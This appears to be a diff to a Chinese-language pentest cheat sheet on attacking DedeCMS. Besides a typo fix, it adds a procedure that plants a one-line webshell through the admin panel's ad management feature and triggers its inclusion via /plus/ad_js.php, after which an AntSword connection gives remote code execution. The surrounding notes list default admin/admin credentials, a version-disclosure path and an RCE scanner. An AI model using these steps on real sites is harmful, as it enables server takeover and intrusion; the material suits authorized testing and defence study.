@@ -4,7 +4,7 @@
 通用：
 ```
 默认账号密码：admin/admin
-默认路径dede，如果不是可以看rebots.txt 
+默认路径dede，如果不是可以看robots.txt 
 ```
 Dedecms RCE扫描器
 
@@ -16,6 +16,15 @@ https://github.com/lengjibo/dedecmscan
 
 ```
 /data/admin/ver.txt
+```
+
+dede后台getshell
+
+```
+/辅助插件/广告管理/正常显示内容：输入一句话
+访问/plus/ad_js.php?aid=1 |postdata:nocache=1
+上述的广告内容就会写入myad-1.html中，而ad_js.php会包含该文件
+使用蚁剑连接/plus/ad_js.php
 ```
 
 DedeCMSV57_UTF8_SP2  getshell
